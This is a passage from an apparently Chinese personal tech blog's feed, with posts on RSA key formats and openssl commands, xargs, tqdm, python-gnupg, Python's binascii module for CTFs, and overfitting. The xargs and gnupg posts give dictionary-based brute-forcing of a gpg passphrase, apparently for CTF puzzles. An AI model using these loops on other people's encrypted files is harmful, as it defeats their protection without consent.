class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">RSAPrivateKey ::= SEQUENCE &#123;</span><br><span class="line">  version           Version,</span><br><span class="line">  modulus           INTEGER,  -- n</span><br><span class="line">  publicExponent    INTEGER,  -- e</span><br><span class="line">  privateExponent   INTEGER,  -- d</span><br><span class="line">  prime1            INTEGER,  -- p</span><br><span class="line">  prime2            INTEGER,  -- q</span><br><span class="line">  exponent1         INTEGER,  -- d mod (p-1)</span><br><span class="line">  exponent2         INTEGER,  -- d mod (q-1)</span><br><span class="line">  coefficient       INTEGER,  -- (inverse of q) mod p</span><br><span class="line">  otherPrimeInfos   OtherPrimeInfos OPTIONAL</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ul><li>version 是版本号，两个素数为0，如果使用了多素数，则版本号应该是1。<br>Version ::= INTEGER { two-prime(0), multi(1) }<br>(CONSTRAINED BY {– version must be multi if otherPrimeInfos present –})</li><li>modulus 是RSA模数n。</li><li>publicExponent 是RSA的公钥e。</li><li>privateExponent 是RSA的私钥d。</li><li>prime1 是n的素数因子p</li><li>prime2 是n的素数因子q</li><li>exponent1 等于d mod (p − 1)。</li><li>exponent2 等于d mod (q − 1)。</li><li>coefficient 等于 q–1 mod p。</li><li>otherPrimeInfos 按顺序包含了其它素数r3, 如果version是0 ，它应该被忽略；而如果version是1，它应该至少包含OtherPrimeInfo的一个实例。</li></ul><h3><span id="pkcs-8">PKCS #8</span></h3><p>未加密PEM格式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN PRIVATE KEY-----</span><br><span class="line">BASE64 ENCODED DATA</span><br><span class="line">-----END PRIVATE KEY-----</span><br></pre></td></tr></table></figure></p><p>对应的DER：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PrivateKeyInfo ::= SEQUENCE &#123;</span><br><span class="line">  version         Version,</span><br><span class="line">  algorithm       AlgorithmIdentifier,</span><br><span class="line">  PrivateKey      BIT STRING</span><br><span class="line">&#125;</span><br><span class="line">AlgorithmIdentifier ::= SEQUENCE &#123;</span><br><span class="line">  algorithm       OBJECT IDENTIFIER,</span><br><span class="line">  parameters      ANY DEFINED BY algorithm OPTIONAL</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>针对私钥的内容进行加密PEM格式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN ENCRYPTED PRIVATE KEY-----</span><br><span class="line">BASE64 ENCODED DATA</span><br><span class="line">-----END ENCRYPTED PRIVATE KEY-----</span><br></pre></td></tr></table></figure></p><p>DER格式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">EncryptedPrivateKeyInfo ::= SEQUENCE &#123;</span><br><span class="line">  encryptionAlgorithm  EncryptionAlgorithmIdentifier,</span><br><span class="line">  encryptedData        EncryptedData</span><br><span class="line">&#125;</span><br><span class="line">EncryptionAlgorithmIdentifier ::= AlgorithmIdentifier</span><br><span class="line">EncryptedData ::= OCTET STRING</span><br></pre></td></tr></table></figure></p><h2><span id="生成私钥">生成私钥</span></h2><p>openssl有多种方法生成私钥：</p><ul><li>genrsa生成RSA密钥。</li><li>req在生成req证书请求时同时产生密钥。</li><li>genpkey除了可以生成RSA密钥外，还可以生成DSA、DH密钥。</li></ul><p>举例说明：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl genpkey -algorithm RSA -out privatekey.pem -pass pass:1234 -des-ede3-cbc</span><br></pre></td></tr></table></figure></p><h2><span id="查看秘钥">查看秘钥</span></h2><ul><li>查看私钥<code>openssl rsa -in rsa.key</code></li><li>查看公钥<code>openssl rsa -in rsa.key -pubout</code></li><li>查看公钥和modulus <code>openssl rsa -in rsa.key -modulus</code></li><li>查看密钥的详细信息,包含component prime等细节信息，这些信息的值都是冒号分割的，称为abstract<code>openssl rsa -in rsa.key -text</code></li><li>查看只有public key的文件<code>openssl rsa -in pub.txt -pubin</code></li><li>注：pub.txt 可由<code>openssl rsa -in rsa.key -pubout &gt;pub.txt</code>或<code>openssl rsa -in rsa.key -pubout -out pub.txt</code>产生如果pub.txt 中不是公钥将报错， -pubin 仅仅说明 -in 所指定的文件里面是什么</li><li>只查看key的其他信息，不显示key<code>openssl  rsa -in rsa.key -noout</code></li></ul><h2><span id="使用rsautl">使用rsautl</span></h2><h3><span id="description">DESCRIPTION</span></h3><blockquote><p>The rsautl command can be used to sign, verify, encrypt, and decrypt data using the RSA algorithm.</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsautl [-<span class="keyword">in</span> file] [-out file] [-inkey file] [-pubin] [-certin] [-sign] [-verify] [-encrypt] [-decrypt] [-pkcs] [-ssl] [-raw] [-hexdump] [-asn1parse]</span><br></pre></td></tr></table></figure><h3><span id="options">Options</span></h3><p><strong>-in filename</strong></p><p>specifies the input file name to read data from or standard input if this option is not specified.</p><p><strong>-out filename</strong></p><p>specifies the output file name to write to or standard output by default.</p><p><strong>-inkey file</strong></p><p>specifies the input key file, by default it should be an RSA private key.</p><p><strong>-pubin</strong></p><p>specifies the input file is an RSA public key.</p><p><strong>-certin</strong></p><p>indicates that the input is a certificate containing an RSA public key.</p><p><strong>-sign</strong></p><p>signs the input data and output the signed result. This requires and RSA private key.</p><p><strong>-verify</strong></p><p>verifies the input data and output the recovered data.</p><p><strong>-encrypt</strong></p><p>**encrypts the input data using an RSA public key.</p><p><strong>-decrypt</strong></p><p>**decrypts the input data using an RSA private key.</p><p><strong>-pkcs</strong><br><strong>-oaep</strong><br><strong>-ssl</strong><br><strong>-raw</strong> </p><p>specifies the padding to use: PKCS#1 v1.5 (the default), PKCS#1 OAEP, special padding used in SSL v2 backwards compatible handshakes, or no padding, respectively. For signatures, only -pkcs and -raw can be used.</p><p><strong>-hexdump</strong> </p><p>hex dumps the output data.</p><p><strong>-asn1parse</strong> </p><p>asn1parse the output data, this is useful when combined with the -verify option.</p><h3><span id="example">example</span></h3><p><strong>签名</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsautl -sign -<span class="keyword">in</span> file -inkey key.pem -out sig</span><br></pre></td></tr></table></figure></p><p><strong>验证签名</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsautl -verify -<span class="keyword">in</span> sig -inkey key.pem</span><br></pre></td></tr></table></figure></p><p><strong>加密</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsautl -encrypt -<span class="keyword">in</span> hello -inkey test_pub.key -pubin -out hello.en</span><br></pre></td></tr></table></figure></p><p><strong>解密</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsautl -decrypt -in hello.en -inkey test.key -out hello.de</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      
        <tags>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xargs命令</title>
      <link href="/2019/03/26/xargs%E5%91%BD%E4%BB%A4/"/>
      <url>/2019/03/26/xargs%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h2><span id="写在前面">写在前面</span></h2><blockquote><p>Linux命令总是停留在入门阶段，以后看到不会的命令就学习记录一下吧。传递参数和标准化输出的时候都可以用xargs</p></blockquote><a id="more"></a><h2><span id="参数介绍">参数介绍</span></h2><ul><li>a file 从文件中读入作为sdtin</li><li>e flag ，注意有的时候可能会是-E，flag必须是一个以空格分隔的标志，当xargs分析到含有flag这个标志的时候就停止。</li><li>p 当每次执行一个argument的时候询问一次用户。</li><li>n num 后面加次数，表示命令在执行的时候一次用的argument的个数，默认是用所有的。</li><li>t 表示先打印命令，然后再执行。</li><li>i 或者是-I，这得看linux支持了，将xargs的每项名称，一般是一行一行赋值给 {}，可以用 {} 代替。</li><li>r no-run-if-empty 当xargs的输入为空的时候则停止xargs，不用再去执行了。</li><li>s num 命令行的最大字符数，指的是 xargs 后面那个命令的最大命令行字符数。</li><li>L num 从标准输入一次读取 num 行送给 command 命令。</li><li>l 同 -L。</li><li>d delim 分隔符，默认的xargs分隔符是回车，argument的分隔符是空格，这里修改的是xargs的分隔符。</li><li>x exit的意思，主要是配合-s使用。。</li><li>P 修改最大的进程数，默认是1，为0时候为as many as it can ，这个例子我没有想到，应该平时都用不到的吧。</li></ul><p>先后顺序大致是这样：-P决定使用进程数，先确定-d后的分隔符来把输入给分割，然后用-n指定一行输出多少个, -i选择把这一行的输出给替换到{}.</p><h2><span id="例子">例子</span></h2><p><strong>以’\n’为分隔符，每行输出一个，4个线程， 输入到xargs的被替换到–passphrase后面的参数里</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">time cat /usr/share/dict/words | xargs -n1 -d<span class="string">'\n'</span> -P4 -i gpg --passphrase &#123;&#125; -d cipher 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p><p><strong>发现在macos里-i这么用</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find docs/ -name &quot;*png&quot; | xargs -I F python myscript.py &quot;F&quot;</span><br></pre></td></tr></table></figure></p><p>还是只记一种用法吧，安装一下gnu的版本：可以用gxargs了<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install findutils</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一个有趣的包——tqdm</title>
      <link href="/2019/03/26/%E4%B8%80%E4%B8%AA%E6%9C%89%E8%B6%A3%E7%9A%84%E5%8C%85%E2%80%94%E2%80%94tqdm/"/>
      <url>/2019/03/26/%E4%B8%80%E4%B8%AA%E6%9C%89%E8%B6%A3%E7%9A%84%E5%8C%85%E2%80%94%E2%80%94tqdm/</url>
      
        <content type="html"><![CDATA[<blockquote><p>这个包很好玩，因为python跑计算量比较大的程序时很多层循环看不到进度很难受，可以使用tqdm查看进度</p></blockquote><h2><span id="安装">安装</span></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install tqdm</span><br></pre></td></tr></table></figure><h2><span id="使用">使用</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tqdm.tqdm</span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> tqdm(a_list):</span><br><span class="line">    <span class="keyword">print</span> s</span><br></pre></td></tr></table></figure><h2><span id="例子">例子</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tqdm</span><br><span class="line">tqdm = tqdm.tqdm</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="number">1000</span>):</span><br><span class="line">    sleep(<span class="number">0.01</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-gnupg Usage</title>
      <link href="/2019/03/26/python-gpg%E6%A8%A1%E5%9D%97%E4%BD%BF%E7%94%A8/"/>
      <url>/2019/03/26/python-gpg%E6%A8%A1%E5%9D%97%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2><span id="写在前面">写在前面</span></h2><blockquote><p>关于python-gnupg的基本使用记录</p></blockquote><a id="more"></a><h2><span id="installation">Installation</span></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install python-gnupg</span><br></pre></td></tr></table></figure><h2><span id="basics">Basics</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gnupg</span><br><span class="line">gpg = gnupg.GPG()</span><br><span class="line">encrypt(data, *recipients, **kwargs)</span><br><span class="line">gpg.decrypt(message, **kwargs)</span><br></pre></td></tr></table></figure><h3><span id="encrypt">encrypt</span></h3><ul><li>data (str) – The file or bytestream to encrypt.</li><li>recipients (str) – The recipients to encrypt to. Recipients must be specified<br>keyID/fingerprint. Care should be taken in Python2.x to make sure that the given fingerprint is in fact a string and not a unicode object.</li><li>default_key (str) – The keyID/fingerprint of the key to use for signing. If given, data<br>will be encrypted and signed.</li><li>passphrase (str) – If given, and default_key is also given, use this passphrase to<br>unlock the secret portion of the default_key to sign the encrypted data. Otherwise,<br>if default_key is not given, but symmetric=True, then use this passphrase as the<br>passphrase for symmetric encryption. Signing and symmetric encryption should not be<br>combined when sending the data to other recipients, else the passphrase to the secret key<br>would be shared with them.</li><li>armor (bool) – If True, ascii armor the output; otherwise, the output will be in binary<br>format. (Default: True)</li><li>encrypt (bool) – If True, encrypt the data using the recipients public keys. (Default:<br>True)</li><li>symmetric (bool) – If True, encrypt the data to recipients using a symmetric key.<br>See the passphrase parameter. Symmetric encryption and public key encryption can<br>be used simultaneously, and will result in a ciphertext which is decryptable with either the<br>symmetric passphrase or one of the corresponding private keys.</li><li>always_trust (bool) – If True, ignore trust warnings on recipient keys. If False, display<br>trust warnings. (default: True)</li></ul><h3><span id="decrypt">decrypt</span></h3><ul><li>message (file or str or io.BytesIO) – A string or file-like object to decrypt.</li><li>always_trust (bool) – Instruct GnuPG to ignore trust checks.</li><li>passphrase (str) – The passphrase for the secret key used for decryption.</li><li>output (str) – A filename to write the decrypted output to.</li></ul><h3><span id="example">example</span></h3><p><strong>encrypt string</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gpg = gnupg.GPG()</span><br><span class="line">message = open(<span class="string">'./message'</span>,<span class="string">'r'</span>).read()</span><br><span class="line">encrypted_data = gpg.encrypt(message, <span class="string">'who'</span>, symetric=<span class="literal">True</span>, passphrase=<span class="string">'password'</span>)</span><br><span class="line">encrypted_string = str(encrypted_data)</span><br></pre></td></tr></table></figure></p><p><strong>decrypt string</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ci = open(<span class="string">'./cipher'</span>, <span class="string">'r'</span>).read()</span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> dictionary:</span><br><span class="line">    decrypted_data = gpg.decrypt(ci, passphrase=s)</span><br><span class="line">    <span class="keyword">if</span> decrypted_data.ok == <span class="literal">False</span>:</span><br><span class="line">        <span class="keyword">print</span> decrypted_data.status</span><br><span class="line">        <span class="keyword">print</span> decrypted_data.stderr</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> decrypted_data.data</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p><p><strong>encrypt file</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gnupg</span><br><span class="line"></span><br><span class="line">gpg = gnupg.GPG(gnupghome=<span class="string">'/home/testgpguser/gpghome'</span>)</span><br><span class="line">open(<span class="string">'my-unencrypted.txt'</span>, <span class="string">'w'</span>).write(<span class="string">'You need to Google Venn diagram.'</span>)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'my-unencrypted.txt'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    status = gpg.encrypt_file(</span><br><span class="line">        f, recipients=[<span class="string">'testgpguser@mydomain.com'</span>],</span><br><span class="line">        output=<span class="string">'my-encrypted.txt.gpg'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'ok: '</span>, status.ok</span><br><span class="line"><span class="keyword">print</span> <span class="string">'status: '</span>, status.status</span><br><span class="line"><span class="keyword">print</span> <span class="string">'stderr: '</span>, status.stderr</span><br></pre></td></tr></table></figure></p><p><strong>decrypt file</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gnupg</span><br><span class="line"></span><br><span class="line">gpg = gnupg.GPG(gnupghome=<span class="string">'/home/testgpguser/gpghome'</span>)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'my-encrypted.txt.gpg'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    status = gpg.decrypt_file(f, passphrase=<span class="string">'my passphrase'</span>, output=<span class="string">'my-decrypted.txt'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'ok: '</span>, status.ok</span><br><span class="line"><span class="keyword">print</span> <span class="string">'status: '</span>, status.status</span><br><span class="line"><span class="keyword">print</span> <span class="string">'stderr: '</span>, status.stderr</span><br></pre></td></tr></table></figure></p><h2><span id="use-keys">Use Keys</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gnupg</span><br><span class="line"><span class="keyword">from</span> pprint <span class="keyword">import</span> pprint <span class="comment"># data pretty printer</span></span><br><span class="line"></span><br><span class="line">gpg = gnupg.GPG(gnupghome=<span class="string">'/home/testgpguser/gpghome'</span>)</span><br><span class="line">key_data = open(<span class="string">'mykeyfile.asc'</span>).read()</span><br><span class="line">import_result = gpg.import_keys(key_data)</span><br><span class="line">pprint(import_result.results)</span><br></pre></td></tr></table></figure><h3><span id="list-keys">list keys</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gnupg</span><br><span class="line"><span class="keyword">from</span> pprint <span class="keyword">import</span> pprint <span class="comment"># data pretty printer</span></span><br><span class="line"></span><br><span class="line">gpg = gnupg.GPG(gnupghome=<span class="string">'/home/testgpguser/gpghome'</span>)</span><br><span class="line">public_keys = gpg.list_keys()</span><br><span class="line">private_keys = gpg.list_keys(<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'public keys:'</span></span><br><span class="line">pprint(public_keys)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'private keys:'</span></span><br><span class="line">pprint(private_keys)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctf中常用模块之binascii</title>
      <link href="/2019/03/23/ctf%E4%B8%AD%E5%B8%B8%E7%94%A8%E6%A8%A1%E5%9D%97%E4%B9%8Bbinascii/"/>
      <url>/2019/03/23/ctf%E4%B8%AD%E5%B8%B8%E7%94%A8%E6%A8%A1%E5%9D%97%E4%B9%8Bbinascii/</url>
      
        <content type="html"><![CDATA[<h2><span id="写在前面">写在前面</span></h2><blockquote><p>ctf各类题目里都经常遇到要用python处理以字符串形式拿到的地址值（尤其是pwn）,有的时候写起来还挺伤脑筋的。记录一下好用的binascii模块<br><a id="more"></a><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> *</span><br></pre></td></tr></table></figure></p></blockquote><h2><span id="b2a_hex-和-a2b_hex">b2a_hex 和 a2b_hex</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: <span class="keyword">from</span> binascii <span class="keyword">import</span> *</span><br><span class="line">In [<span class="number">2</span>]: b2a_hex(<span class="string">'\x16\x31\x66\x58'</span>)</span><br><span class="line">Out[<span class="number">2</span>]: <span class="string">'16316658'</span></span><br><span class="line">In [<span class="number">3</span>]: a2b_hex(<span class="string">'16316658'</span>)</span><br><span class="line">Out[<span class="number">3</span>]: <span class="string">'\x161fX'</span></span><br></pre></td></tr></table></figure><h2><span id="hexlify">hexlify</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">4</span>]: hexlify(<span class="string">'hello'</span>)</span><br><span class="line">Out[<span class="number">4</span>]: <span class="string">'68656c6c6f'</span></span><br><span class="line">In [<span class="number">5</span>]: a2b_hex(<span class="string">'68656c6c6f'</span>)</span><br><span class="line">Out[<span class="number">5</span>]: <span class="string">'hello'</span></span><br><span class="line">In [<span class="number">6</span>]: unhexlify(<span class="string">'68656c6c6f'</span>)</span><br><span class="line">Out[<span class="number">6</span>]: <span class="string">'hello'</span></span><br></pre></td></tr></table></figure><h2><span id="函数列表">函数列表</span></h2><p>其实作用就是把二进制的数据按照字节返回成十六进制的表示，但是binascii模块里还有一堆可以把二进制数据返回成其他表示的函数：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">binascii.a2b_uu(string)</span><br><span class="line"></span><br><span class="line">binascii.b2a_uu(data)</span><br><span class="line"></span><br><span class="line">binascii.a2b_base64(string)</span><br><span class="line"></span><br><span class="line">binascii.b2a_base64(data)</span><br><span class="line"></span><br><span class="line">binascii.a2b_qp(string[, header])</span><br><span class="line"></span><br><span class="line">binascii.b2a_qp(data[, quotetabs, istext, header])</span><br><span class="line"></span><br><span class="line">binascii.a2b_hqx(string)</span><br><span class="line"></span><br><span class="line">binascii.rledecode_hqx(data)</span><br><span class="line"></span><br><span class="line">binascii.rlecode_hqx(data)</span><br><span class="line"></span><br><span class="line">binascii.b2a_hqx(data)</span><br><span class="line"></span><br><span class="line">binascii.crc_hqx(data, crc)</span><br><span class="line"></span><br><span class="line">binascii.crc32(data[, crc])</span><br><span class="line"></span><br><span class="line">binascii.b2a_hex(data)</span><br><span class="line"></span><br><span class="line">binascii.b2a_hex(data)</span><br><span class="line"></span><br><span class="line">binascii.hexlify(data)</span><br><span class="line"></span><br><span class="line">binascii.a2b_hex(hexstr)</span><br><span class="line"></span><br><span class="line">binascii.unhexlify(hexstr)</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>underfitting &amp; overfitting</title>
      <link href="/2019/03/22/underfitting-overfitting/"/>
      <url>/2019/03/22/underfitting-overfitting/</url>
      
        <content type="html"><![CDATA[<h2><span id="写在前面">写在前面</span></h2><blockquote><p>对过拟合和欠拟合的一些理解</p></blockquote><a id="more"></a><h2><span id="loss-function-adjustment">loss function adjustment</span></h2><p>梯度下降目的就是把loss function最小化，但是我们怎么知道给定好的loss function，平方和为什么是一个恰当的衡量标准？假设我们有一个衡量拟合结果有多好的fit function，那么其实最大化fit function能达到和最小化loss function一样的效果。不这么做的原因是，fit funcion并不会因为输入的微笑改变而改变，或者说不是平滑的。因此不好微分。。从而没法梯度下降。但是平方和很多时候也并不能很好的衡量loss的真实情况，因为可能让loss fuction值小的条件是让拟合出来的结果变得很陡峭。我们现实生活中，连续的、平滑的情况还是占绝大多数。因此对loss function做一些调整很有必要，可能就平方和函数而言loss值更大，但是函数更加平滑，那这种结果更加可取。因此在loss funcion后加上一个调整项：$loss =\sum_{n} \left ( y^{n} - f^{n}(x) \right )^{2}+ \sum_{n} \omega^{2}$. 这个方法可以用在很多场景，被称为regularization</p><p><img src="/assets/img/fitting/regularization.png" alt="regularization"></p><h2><span id="variance-and-bias">variance and bias</span></h2><p>方差和偏差的理解其实没什么太大问题，主要是应用在讨论训练模型和理想模型的偏离的时候，需要结合在一起考虑需要理解清楚。对于一个实际的问题，在选定model和给定数据的情况下，我们可以训练出来的最佳fucntion设为$f1$.实际问题的真实function设为$f2$.想象一下，如果我们可以重复拿到数据选定同一个model训练10000次，那么每一次都可以训练出来一个$f1$.可以假设第n次训练出来的叫做$f_{1n}$.那么这n次训练出来的f的期望可以写成${*}_f$.可以想象，如果数据量很大，那么10000次下来，平均期望已经是选定model中针对实际问题最好的function了，但是这个function必然也会和实际的$f2$有一定的差距。这个差距我们就称为<strong>bias</strong>。这10000个sample的variance的大小取决于模型的复杂度和数据量。如果模型很简单，自然variance也会比较小。每次的数据量比较大，variance也会比较大。回到最初的问题，我选取好一个model，然后给定了数据，这时的和理想中最佳function相比的error来自于哪里呢？很简单，一个是来自于bias，一个是来自于variance。如果把理想的function看做射击时候的靶心，那么bias代表的就是瞄准的点和靶心的距离。如果variance大，那么瞄的准也不一定打得准。如果variance小，瞄准哪里基本上就打在哪里。因此给定一个复杂的model，想要让variance小，就让数据量大。这时候需要祭出李宏毅老师的图<br><img src="/assets/img/fitting/variance.png" alt="variance and bias"></p><p><img src="/assets/img/fitting/fitting.png" alt="fitting"></p><h2><span id="summary">summary</span></h2><p>之所以写这个是因为之前在西瓜书上看到overfitting的本质是学习过度了，意思是把训练集的特征学的过多，以至于真实情况中没有满足训练集的特征但是仍然属于result中的结果给排除在外了。举个例子是说：学习器认为有叶子，绿色的才是树。这是因为训练集中没有光秃秃的树，导致看到了光秃秃的树，学习器就判断失误了。underfitting是说，学习器认为绿色的就是树，这是学习不足导致的，连有没有叶子这个特征都没有学会识别，可以加强训练。真实情况中呢，更容易遇到的是overfitting，因为大部分网络的学习能力都是很强的（只要model选的问题不太大）。这里的结论却是：与理想function相比，bias带来的error大，则是underfitting，variance带来的error大则是overfitting。怎么理解这句话呢：</p><ul><li>bias太大证明模型太简单了，学习能力不足，学习不足的原因是model选的就有问题，数据量再怎么大也没法解决bias大带来的error。因此需要improve自己的model</li><li>variance太大证明数据量太小了，即使model选的很好，学习能力也很强，但是学到的训练集的特征不能代表整体的特征，也就是overfitting，需要enlarge dataset.</li></ul><h2><span id="reference">Reference</span></h2><ol><li><a href="http://speech.ee.ntu.edu.tw/~tlkagk/courses/ML_2016/Lecture/Bias%20and%20Variance%20%28v2%29.pdf" target="_blank" rel="noopener">where does the error come from</a></li><li>[周志华] [机器学习]</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> machine learning </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学小整理</title>
      <link href="/2019/03/21/%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6%E2%80%94%E2%80%94%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E5%92%8C%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86/"/>
